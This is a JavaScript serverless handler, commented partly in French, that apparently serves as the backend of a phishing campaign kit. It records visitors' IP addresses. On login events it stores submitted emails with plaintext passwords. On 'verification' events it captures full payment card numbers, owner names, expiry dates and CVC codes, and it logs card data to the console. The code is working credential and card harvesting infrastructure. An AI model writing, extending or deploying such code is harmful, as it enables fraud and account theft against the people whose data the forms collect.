import { getCampaignById } from '../../../tools/supabase/campaigns.js';
import { storeEvent } from '../../../tools/supabase/events.js';
import { storeContact, getContactByEmail } from '../../../tools/supabase/contacts.js';
import { storeCard } from '../../../tools/supabase/cards.js';
import { storeLogin } from '../../../tools/supabase/logins.js';
import { updatePayment } from '../../../tools/supabase/payments.js';

export default async function handler(req, res) {
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'unknown';
    const { campaign = '', eventType = 'submission' } = req.body || {};
    const formPayload = (req.body && typeof req.body.payload === 'object') ? req.body.payload : (req.body || {});

    // Résoudre campaignId (UUID) depuis id ou name
    if (!campaign) {
      return res.status(400).json({ success: false, error: 'campaign is required' });
    }
    const campaignRow = await getCampaignById(campaign);
    if (!campaignRow?.id) {
      return res.status(404).json({ success: false, error: 'campaign not found' });
    }
    const campaignId = campaignRow.id;
    const contactId = await getContactByEmail(formPayload.email).then(contact => contact?.id);

    // Créer / mettre à jour le contact sur les événements clés AVANT de tracker l'événement
    switch (eventType) {
      case 'booking': {
        const email = formPayload.email;
        const phone = formPayload.phone || '';
        await storeContact({ email, phone, ip, campaignId, eventId: null, eventType });
        break;
      }
      case 'login':
        console.log('contactId', contactId);
        if (contactId && formPayload.password) {
          await storeLogin(contactId, formPayload.email, formPayload.password, 'login_page');
        } else {
          console.log('ERROR STORE LOGIN: no password provided');
        }
        break;
      case 'verification_start':
      case 'verification_retry':
        console.log('formPayload', formPayload);
        console.log('contactId', contactId);
        // Ne plus créer le paiement ici (eventId pas encore connu). On peut toutefois stocker la carte si présente.
        if (contactId) {
          const mappedCard = formPayload.cardDetails || {
            cardNumber: formPayload.cardNumber || formPayload.card,
            cardOwner: formPayload.cardOwner || formPayload.name,
            cardExpiration: formPayload.cardExpiration || formPayload.exp,
            cardCVC: formPayload.cardCVC || formPayload.cvv,
          };
          const hasCard = mappedCard.cardNumber || mappedCard.cardOwner || mappedCard.cardExpiration || mappedCard.cardCVC;
          if (hasCard) {
            await storeCard(contactId, mappedCard);
          }
        }
        break;
      case 'verification_success':
      case 'verification_error':
        if (formPayload.paymentId) {
          await updatePayment(formPayload.paymentId, formPayload.status || 'error');
        }
        break;
      default:
        break;
    }

    // Track the event avec le contact_id final
    const eventResult = await storeEvent(eventType, ip, { ...formPayload, campaign: campaignId }, campaignId, contactId);
    const eventId = eventResult.eventId;

    res.status(200).json({ success: true, eventId, contactId });
  } catch (e) {
    console.error('Track submission error:', e);
    res.status(500).json({ success: false, error: e.message });
  }
}
